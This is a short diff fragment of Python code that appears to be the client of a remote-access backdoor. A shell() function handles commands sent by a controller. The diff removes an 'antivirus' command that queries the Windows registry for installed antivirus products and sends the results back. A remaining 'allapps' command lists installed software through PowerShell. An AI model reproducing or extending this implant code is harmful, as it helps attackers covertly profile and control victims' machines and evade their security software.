@@ -359,20 +359,6 @@ def shell():
             except:
                 pass
 
-        elif command == 'antivirus':
-            try:
-                reg_key='HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av'
-                execute = subprocess.run(['reg', 'query', reg_key, '/s'], shell=True, stdout=subprocess.PIPE, 
-                                         stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-                result = execute.stdout + execute.stderr
-                result = result.decode()
-                #print(result)
-                reliable_send(result)
-            except:
-                pass
-
-
         elif command == 'allapps':
             try:
                 execute = subprocess.run(['powershell', 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Vendor, Version'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
